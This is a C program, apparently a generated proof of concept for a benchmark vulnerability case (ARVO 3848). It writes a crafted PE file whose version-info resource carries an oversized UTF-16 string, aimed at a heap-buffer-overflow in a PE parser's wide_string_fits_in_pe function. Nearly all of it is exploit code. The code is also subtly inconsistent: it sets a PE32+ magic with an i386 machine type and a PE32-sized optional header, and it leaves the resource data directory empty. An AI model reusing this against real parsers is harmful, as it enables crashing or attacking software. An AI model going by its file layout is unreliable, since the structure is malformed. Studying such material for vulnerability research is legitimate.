#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:3848 */
/* Triggers: heap-buffer-overflow in wide_string_fits_in_pe */
/* Vuln class: heap_buffer_overflow */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Craft a PE file with a wide string that overflows the buffer */
    /* The crash shows a 1954-byte allocation, read at offset 0x1224 (2 bytes past end) */
    /* We need to create a PE structure where a wide string conversion reads past allocated space */
    
    /* Write minimal PE header */
    fputc('M', f); fputc('Z', f); /* MZ signature */
    for (int i = 0; i < 58; i++) fputc(0, f); /* padding */
    
    /* PE offset at 0x3C */
    fseek(f, 0x3C, SEEK_SET);
    unsigned int pe_offset = 0x80;
    fwrite(&pe_offset, 4, 1, f);
    
    /* Write PE signature and COFF header at offset 0x80 */
    fseek(f, 0x80, SEEK_SET);
    fputc('P', f); fputc('E', f); fputc(0, f); fputc(0, f); /* PE\0\0 */
    
    /* Machine = 0x14C (i386) */
    unsigned short machine = 0x14C;
    fwrite(&machine, 2, 1, f);
    
    /* Number of sections */
    unsigned short num_sections = 1;
    fwrite(&num_sections, 2, 1, f);
    
    /* TimeDateStamp */
    unsigned int timedate = 0;
    fwrite(&timedate, 4, 1, f);
    
    /* PointerToSymbolTable */
    unsigned int symtab = 0;
    fwrite(&symtab, 4, 1, f);
    
    /* NumberOfSymbols */
    unsigned int numsyms = 0;
    fwrite(&numsyms, 4, 1, f);
    
    /* SizeOfOptionalHeader */
    unsigned short opt_hdr_size = 0xE0;
    fwrite(&opt_hdr_size, 2, 1, f);
    
    /* Characteristics */
    unsigned short chars = 0x102;
    fwrite(&chars, 2, 1, f);
    
    /* Optional header - PE32+ */
    /* Magic = 0x20B (PE32+) */
    unsigned short magic = 0x20B;
    fwrite(&magic, 2, 1, f);
    
    /* LMajor, LMinor */
    fputc(14, f); fputc(0, f);
    
    /* SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData */
    unsigned int zero = 0;
    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f);
    
    /* AddressOfEntryPoint */
    fwrite(&zero, 4, 1, f);
    
    /* BaseOfCode */
    fwrite(&zero, 4, 1, f);
    
    /* ImageBase (64-bit) */
    unsigned long long image_base = 0x400000;
    fwrite(&image_base, 8, 1, f);
    
    /* SectionAlignment, FileAlignment */
    unsigned int sect_align = 0x1000;
    unsigned int file_align = 0x200;
    fwrite(&sect_align, 4, 1, f);
    fwrite(&file_align, 4, 1, f);
    
    /* MajorOperatingSystemVersion through SizeOfImage */
    fwrite(&zero, 4, 1, f); /* MajorOSVersion + MinorOSVersion */
    fwrite(&zero, 4, 1, f); /* MajorImageVersion + MinorImageVersion */
    fwrite(&zero, 4, 1, f); /* MajorSubsystemVersion + MinorSubsystemVersion */
    fwrite(&zero, 4, 1, f); /* Win32VersionValue */
    unsigned int size_of_image = 0x2000;
    fwrite(&size_of_image, 4, 1, f);
    unsigned int size_of_headers = 0x200;
    fwrite(&size_of_headers, 4, 1, f);
    fwrite(&zero, 4, 1, f); /* CheckSum */
    
    /* Subsystem */
    unsigned short subsystem = 2; /* WINDOWS_GUI */
    fwrite(&subsystem, 2, 1, f);
    
    /* DllCharacteristics */
    unsigned short dll_chars = 0;
    fwrite(&dll_chars, 2, 1, f);
    
    /* SizeOfStackReserve/Commit, SizeOfHeapReserve/Commit */
    unsigned long long stack_reserve = 0x100000;
    unsigned long long stack_commit = 0x1000;
    unsigned long long heap_reserve = 0x100000;
    unsigned long long heap_commit = 0x1000;
    fwrite(&stack_reserve, 8, 1, f);
    fwrite(&stack_commit, 8, 1, f);
    fwrite(&heap_reserve, 8, 1, f);
    fwrite(&heap_commit, 8, 1, f);
    
    /* LoaderFlags, NumberOfRvaAndSizes */
    fwrite(&zero, 4, 1, f);
    unsigned int num_rvas = 16;
    fwrite(&num_rvas, 4, 1, f);
    
    /* Write 16 empty data directory entries */
    for (int i = 0; i < 16; i++) {
        fwrite(&zero, 4, 1, f); /* VirtualAddress */
        fwrite(&zero, 4, 1, f); /* Size */
    }
    
    /* Section table - create a section with a resource directory that has a wide string */
    /* Section name: .rdata */
    fputc('.', f); fputc('r', f); fputc('d', f); fputc('a', f); fputc('t', f); fputc('a', f);
    fputc(0, f); fputc(0, f);
    
    /* VirtualSize */
    unsigned int vsize = 0x800;
    fwrite(&vsize, 4, 1, f);
    
    /* VirtualAddress */
    unsigned int vaddr = 0x1000;
    fwrite(&vaddr, 4, 1, f);
    
    /* SizeOfRawData */
    unsigned int raw_size = 0x800;
    fwrite(&raw_size, 4, 1, f);
    
    /* PointerToRawData */
    unsigned int raw_ptr = 0x200;
    fwrite(&raw_ptr, 4, 1, f);
    
    /* PointerToRelocations, PointerToLinenumbers, NumberOfRelocations, NumberOfLinenumbers */
    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 4, 1, f);
    fwrite(&zero, 2, 1, f);
    fwrite(&zero, 2, 1, f);
    
    /* Characteristics */
    unsigned int section_chars = 0x40000040; /* INITIALIZED_DATA | READ */
    fwrite(&section_chars, 4, 1, f);
    
    /* Now write the resource data that triggers the overflow */
    /* We need a resource directory entry that points to a wide string */
    /* The wide_string_fits_in_pe function likely converts a UTF-16 string to UTF-8 */
    /* and overflows the buffer if the string is long enough */
    
    fseek(f, 0x200, SEEK_SET);
    
    /* Create a resource directory structure */
    /* IMAGE_RESOURCE_DIRECTORY */
    unsigned int res_zero = 0;
    unsigned short res_short = 0;
    
    /* Characteristics, TimeDateStamp, MajorVersion, MinorVersion */
    fwrite(&res_zero, 4, 1, f);
    fwrite(&res_zero, 4, 1, f);
    fwrite(&res_short, 2, 1, f);
    fwrite(&res_short, 2, 1, f);
    
    /* NumberOfNamedEntries, NumberOfIdEntries */
    unsigned short num_named = 0;
    unsigned short num_id = 1;
    fwrite(&num_named, 2, 1, f);
    fwrite(&num_id, 2, 1, f);
    
    /* Entry for type ID 16 (RT_VERSION) */
    unsigned int entry_name = 16; /* ID */
    unsigned int entry_offset = 0x20; /* Offset to next directory */
    fwrite(&entry_name, 4, 1, f);
    fwrite(&entry_offset, 4, 1, f);
    
    /* Second level directory */
    fwrite(&res_zero, 4, 1, f);
    fwrite(&res_zero, 4, 1, f);
    fwrite(&res_short, 2, 1, f);
    fwrite(&res_short, 2, 1, f);
    fwrite(&num_named, 2, 1, f);
    fwrite(&num_id, 1, 2, f); /* 1 ID entry */
    
    /* Entry for language ID 0x409 */
    unsigned int lang_id = 0x409;
    unsigned int data_entry_offset = 0x30;
    fwrite(&lang_id, 4, 1, f);
    fwrite(&data_entry_offset, 4, 1, f);
    
    /* Data entry */
    unsigned int data_rva = 0x50; /* RVA within section */
    unsigned int data_size = 0x800; /* Large size */
    fwrite(&data_rva, 4, 1, f);
    fwrite(&data_size, 4, 1, f);
    fwrite(&res_zero, 4, 1, f); /* CodePage */
    fwrite(&res_zero, 4, 1, f); /* Reserved */
    
    /* Write a VS_VERSIONINFO structure with a very long wide string */
    fseek(f, 0x250, SEEK_SET);
    
    /* VS_VERSIONINFO: wLength, wValueLength, wType */
    unsigned short ver_len = 0x800;
    unsigned short val_len = 0x34;
    unsigned short type = 0; /* binary */
    fwrite(&ver_len, 2, 1, f);
    fwrite(&val_len, 2, 1, f);
    fwrite(&type, 2, 1, f);
    
    /* Key: L"VS_VERSION_INFO" (16 wide chars + null = 34 bytes) */
    unsigned short vs_key[] = {'V','S','_','V','E','R','S','I','O','N','_','I','N','F','O',0};
    fwrite(vs_key, sizeof(vs_key), 1, f);
    
    /* Padding to align */
    fputc(0, f); fputc(0, f);
    
    /* VS_FIXEDFILEINFO */
    unsigned int sig = 0xFEEF04BD;
    unsigned int struc_ver = 0x00010000;
    unsigned int file_ver_ms = 0x00010000;
    unsigned int file_ver_ls = 0x00010000;
    unsigned int prod_ver_ms = 0x00010000;
    unsigned int prod_ver_ls = 0x00010000;
    unsigned int file_flags_mask = 0x3F;
    unsigned int file_flags = 0;
    unsigned int file_os = 0x40004;
    unsigned int file_type = 1;
    unsigned int file_subtype = 0;
    unsigned int file_date_ms = 0;
    unsigned int file_date_ls = 0;
    
    fwrite(&sig, 4, 1, f);
    fwrite(&struc_ver, 4, 1, f);
    fwrite(&file_ver_ms, 4, 1, f);
    fwrite(&file_ver_ls, 4, 1, f);
    fwrite(&prod_ver_ms, 4, 1, f);
    fwrite(&prod_ver_ls, 4, 1, f);
    fwrite(&file_flags_mask, 4, 1, f);
    fwrite(&file_flags, 4, 1, f);
    fwrite(&file_os, 4, 1, f);
    fwrite(&file_type, 4, 1, f);
    fwrite(&file_subtype, 4, 1, f);
    fwrite(&file_date_ms, 4, 1, f);
    fwrite(&file_date_ls, 4, 1, f);
    
    /* Now write a StringFileInfo with a very long wide string */
    /* wLength, wValueLength, wType */
    unsigned short str_info_len = 0x700;
    unsigned short str_info_val = 0;
    unsigned short str_info_type = 1; /* text */
    fwrite(&str_info_len, 2, 1, f);
    fwrite(&str_info_val, 2, 1, f);
    fwrite(&str_info_type, 2, 1, f);
    
    /* Key: L"StringFileInfo" */
    unsigned short sf_key[] = {'S','t','r','i','n','g','F','i','l','e','I','n','f','o',0};
    fwrite(sf_key, sizeof(sf_key), 1, f);
    
    /* Padding */
    fputc(0, f); fputc(0, f);
    
    /* Child: StringTable with lang/charset */
    unsigned short st_len = 0x600;
    unsigned short st_val = 0;
    unsigned short st_type = 1;
    fwrite(&st_len, 2, 1, f);
    fwrite(&st_val, 2, 1, f);
    fwrite(&st_type, 2, 1, f);
    
    /* Key: L"040904B0" (lang 0x409, charset 0x4B0) */
    unsigned short lang_key[] = {'0','4','0','9','0','4','B','0',0};
    fwrite(lang_key, sizeof(lang_key), 1, f);
    
    /* Padding */
    fputc(0, f); fputc(0, f);
    
    /* Child: String with a VERY long value to trigger overflow */
    unsigned short str_entry_len = 0x500;
    unsigned short str_entry_val = 0x4E0; /* Large value length */
    unsigned short str_entry_type = 1;
    fwrite(&str_entry_len, 2, 1, f);
    fwrite(&str_entry_val, 2, 1, f);
    fwrite(&str_entry_type, 2, 1, f);
    
    /* Key: L"FileDescription" */
    unsigned short fd_key[] = {'F','i','l','e','D','e','s','c','r','i','p','t','i','o','n',0};
    fwrite(fd_key, sizeof(fd_key), 1, f);
    
    /* Padding */
    fputc(0, f); fputc(0, f);
    
    /* Value: Very long wide string (approximately 0x4E0 bytes of UTF-16 data) */
    /* This will cause the conversion to UTF-8 to overflow the output buffer */
    for (int i = 0; i < 0x270; i++) {
        unsigned short wchar = 0x41; /* 'A' */
        fwrite(&wchar, 2, 1, f);
    }
    
    fclose(f);
    return 0;
}